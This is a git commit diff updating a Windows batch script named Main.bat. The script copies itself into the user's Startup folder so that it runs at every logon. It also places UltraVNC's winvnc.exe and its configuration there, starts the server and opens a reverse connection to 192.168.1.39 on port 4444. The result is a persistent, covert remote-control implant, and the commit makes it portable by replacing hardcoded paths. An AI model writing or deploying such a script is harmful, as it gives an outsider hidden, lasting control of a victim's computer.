6c1c6d3d4c3c377128d7ba9502fcd7519bcef51f
GooseLoose0809 <122241263+GooseLoose0809@users.noreply.github.com>
2024-06-19 22:26:19 -0500

    Update Main.bat

--- Main.bat
+++ Main.bat
@@ -1,13 +1,25 @@
 @echo off
 set startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
 
+REM Copy the batch file itself to the startup folder if it doesn't already exist
 if not exist "%startup_folder%\%~nx0" (
   copy "%~f0" "%startup_folder%\"
 )
 
-copy "C:\Users\goose\Downloads\UltraVNC_1500-dev\x64\Client\ultravnc.ini" "%startup_folder%\"
-copy "C:\Users\goose\Downloads\UltraVNC_1500-dev\x64\Client\winvnc.exe" "%startup_folder%\"
+REM Determine the directory where this batch file is located
+set script_dir=%~dp0
 
-start winvnc.exe -run
+REM Copy the ultravnc.ini file to the startup folder
+if exist "%script_dir%ultravnc.ini" (
+  copy "%script_dir%ultravnc.ini" "%startup_folder%\"
+)
+
+REM Copy the winvnc.exe file to the startup folder
+if exist "%script_dir%winvnc.exe" (
+  copy "%script_dir%winvnc.exe" "%startup_folder%\"
+)
+
+REM Start winvnc.exe
+start "%startup_folder%\winvnc.exe" -run
 timeout /t 1 >nul
-start winvnc.exe -connect 192.168.1.39::4444
+start "%startup_folder%\winvnc.exe" -connect 192.168.1.39::4444
